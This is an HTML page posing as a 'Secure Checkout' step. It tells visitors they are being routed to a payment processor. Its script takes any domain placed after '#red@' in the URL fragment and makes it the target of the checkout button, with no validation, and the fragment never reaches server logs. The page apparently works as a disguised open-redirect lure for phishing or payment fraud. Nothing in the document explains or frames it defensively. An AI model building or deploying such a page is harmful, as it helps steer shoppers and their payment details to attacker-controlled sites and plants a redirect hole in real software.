<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="referrer" content="origin">
  <title>Order Summary | Secure Checkout</title>
  <style>
    body { font-family: system-ui, sans-serif; background: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .card { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 100%; }
    .btn { display: inline-block; background: #007bff; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; font-weight: bold; margin-top: 20px; transition: background 0.3s; }
    .btn:hover { background: #0056b3; }
  </style>
</head>
<body>
  <div class="card">
    <h2>Almost there!</h2>
    <p>You are being securely routed to our payment processor to complete your order.</p>
    <a id="checkout-btn" href="#" class="btn">Proceed to Secure Checkout</a>
  </div>

  <script>
    const hash = window.location.hash;
    const d1 = '#red@';
    
    if (hash.startsWith(d1)) {
      const urlPart = hash.split(d1)[1];
      if (urlPart) {
        const destination = `https://${decodeURIComponent(urlPart)}`;
        document.getElementById('checkout-btn').href = destination;
      }
    } else {
      document.querySelector('.card').innerHTML = '<h2>Error</h2><p>Invalid checkout link.</p>';
    }
  </script>
</body>
</html>
